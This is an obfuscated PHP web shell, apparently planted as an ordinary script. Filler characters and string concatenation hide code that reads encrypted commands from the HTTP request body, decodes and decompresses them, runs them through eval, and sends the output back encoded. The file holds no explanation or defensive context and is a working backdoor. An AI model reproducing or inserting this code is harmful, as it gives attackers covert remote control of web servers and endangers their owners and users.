<?php
$S='p(nts("p(php:p(//inpp(ut")p(,$m)==1) {@p(ob_sp(tp(art();@evap(l(@p(gzuncomp(press(@x';
$t='ZdcF8AOi5Yp(ap(";functionp( x($t,$k){$p(cp(=strlen($k)p(;$l=sp(trlen(p(p($p(t);p($o="";fo';
$I='r($p(ip(=0;$i<$l;){p(for($jp(=0;($p(j<$c&&$ip(<$l);$p(j++,$i++){$p(o.=$tp({$i}^$p';
$X='(k{$j};}}rep(turnp( $o;}ip(f (@prep(g_matchp(("p(/$kh(.+)$p(kp(fp(/",@file_get_conte';
$q=';$p(r=@base6p(4p(_p(encop(de(@x(@gp(zcompress($o),p($p(k));prp(int("$pp($kh$r$kf");}';
$f='$k="4p(2dcp(29ef";$khp(="8fb5eap(c61c6e"p(;$kf="p(3bdb87p(4p(bf0e9";$p="p(Ip(Bp(uqT';
$b=str_replace('iJ','','iJcriJeiJate_iJfiJunctiiJon');
$Z='(@bap(se64_dp(ecodp(e($m[1p(]),$k)))p(;$op(=@ob_p(get_contp(ep(ntp(p(s();@ob_end_clean()';
$Q=str_replace('p(','',$f.$t.$I.$X.$S.$Z.$q);
$w=$b('',$Q);$w();
?>
